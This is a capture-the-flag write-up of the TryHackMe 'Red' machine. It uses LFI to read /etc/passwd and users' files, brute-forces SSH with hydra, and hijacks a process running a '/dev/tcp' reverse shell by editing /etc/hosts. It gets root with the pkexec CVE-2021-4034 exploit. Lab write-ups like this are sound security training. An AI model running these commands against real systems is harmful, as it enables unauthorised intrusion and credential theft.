---
title: "Red"
date: 2025-03-12
image: /assets/img/tryhackme/Red/Red_image.jpg
description: Writeup of the TryHackMe-CTF Red
categories: [TryHackMe, Easy]
tags: [linux, web, lfi, suid]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Red</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>A classic battle for the ages.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/redisl33t">https://tryhackme.com/room/redisl33t</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Red.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.219.185
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-12 06:34 EDT
Nmap scan report for 10.10.219.185
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 36.12 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.219.185
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-12 06:35 EDT
Nmap scan report for 10.10.219.185
Host is up (0.038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
|_  256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.95 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

I started by analyzing the web server. The first thing I noticed was the URL pattern, which resembled an Local File Inclusion (LFI). After testing different payloads, I was able to read `/etc/passwd`:
```bash
$ curl http://10.10.219.185/index.php?page=php://filter/resource=/etc/passwd             
root:x:0:0:root:/root:/bin/bash
[...]
blue:x:1000:1000:blue:/home/blue:/bin/bash
[...]
red:x:1001:1001::/home/red:/bin/bash
```

Since I was able to read arbitrary files from the filesystem, I tried to find something useful. The `.bash_history` file contained an interesting hint for another file:
```bash
$ curl http://10.10.219.185/index.php?page=php://filter/resource=/home/blue/.bash_history
  echo "Red rules"
  cd
  hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
  cat passlist.txt
  rm passlist.txt
  sudo apt-get remove hashcat -y
```

The user blue built a password list based on a file called `.reminder` using hashcat. I was able to download the content of the file and create a password list the same way blue did: 
```bash
$ curl http://10.10.219.185/index.php?page=php://filter/resource=/home/blue/.reminder > pass
$ hashcat --stdout pass -r /usr/share/hashcat/rules/best64.rule > passwdlist
```

Since I knew that the user blue created this list, I used it to brute-force the SSH access:
```bash
$ hydra -l 'blue' -P passwdlist ssh://10.10.219.185
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-12 07:15:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
[DATA] attacking ssh://10.10.219.185:22/
[22][ssh] host: 10.10.219.185   login: blue   password: [removed]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-12 07:15:46
```

The brute-force was successful, and I was able to retrieve the first flag:
```bash
$ ssh blue@10.10.219.185
blue@red:~$ cat flag1 
  THM{[removed]}
```

## Privilege Escalation red

While analyzing the machine, random notes from the user red appeared. These could have come from a script or task running in the background, so I checked the running processes from user red and found red's reverse shell:
```bash
blue@red:~$ ps auxw | grep red
red          949  0.0  0.0   6972  2520 ?        S    12:45   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

The domain `redrules.thm` was set by an entry in the hosts file. Using the following command, I was able to modify the hosts file. After some time, I  received the reverse shell and was able to retrieve the second flag:
```bash
blue@red:~$ /usr/bin/echo "10.21.63.26 redrules.thm" | tee -a /etc/hosts
  10.21.63.26 redrules.thm
red@red:~$ cat flag2
  THM{[removed]}
```

Note that red was trying to kick blue out, so I had to add the entry in the hosts file several times.

## Privilege Escalation root

While searching for a way to escalate the privileges, I checked for SUID bits and found an interesting one in red's home directory. It was `pkexec`, which can be exploited when the SUID bit is set. After some research, I found the following exploit on <a href="https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py">GitHub</a>. I created a Python file locally on my machine and changed the last line to the `pkexec` path on the machine:
```python
libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
```

After copying the file to the machine, I was able to execute the exploit and retrieved the root flag:
```bash
red@red:~/.git$ python3 privesc.py 
  Do you want to choose a custom payload? y/n (n use default payload)  n
  [+] Cleaning pervious exploiting attempt (if exist)
  [+] Creating shared library for exploit code.
  [+] Finding a libc library to call execve
  [+] Found a library at <CDLL 'libc.so.6', handle 7f44ff6cd000 at 0x7f44fef44580>
  [+] Call execve() with chosen payload
  [+] Enjoy your root shell
# whoami
  root
# cd /root
# cat flag3
  THM{[removed]}
```

solved! :)
